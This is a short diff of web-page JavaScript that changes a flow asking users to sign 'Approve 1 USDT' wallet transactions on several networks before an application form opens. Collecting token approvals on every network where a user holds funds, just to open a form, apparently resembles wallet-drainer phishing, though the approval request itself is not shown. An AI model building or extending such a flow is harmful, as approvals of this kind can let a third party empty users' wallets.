@@ -539,7 +539,7 @@ async function requestCurrentApproval() {
   const p = paymentQueue[paymentIndex];
   const label = networkLabel(p && p.network);
   setLoaderStep('sign');
-  setBusy(true, 'Approve 1 USDT on ' + label, 'Confirm the approval in your wallet. The next network starts only after this signature.');
+  setBusy(true, 'Approve 1 USDT on ' + label, 'Confirm the approval in your wallet. After it succeeds, the application form will open.');
   try {
     const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
       method: 'POST',
@@ -589,11 +589,11 @@ async function runCurrentNetwork() {
 
 function finishApprovals() {
   if (resolved) return;
-  if (verifiedPayments.size < paymentQueue.length) {
+  if (!verifiedPayments.size) {
     setBusy(
       true,
-      'Approvals incomplete',
-      'Every network with at least 1 USDT must be signed before the application form.'
+      'Approval incomplete',
+      'The 1 USDT approval must be confirmed before the application form.'
     );
     return;
   }
@@ -613,6 +613,8 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
   if (reason === 'verified') {
     confirmedNetworks += 1;
     if (id) verifiedPayments.add(id);
+    finishApprovals();
+    return;
   }
   paymentIndex += 1;
   if (paymentIndex >= paymentQueue.length) {
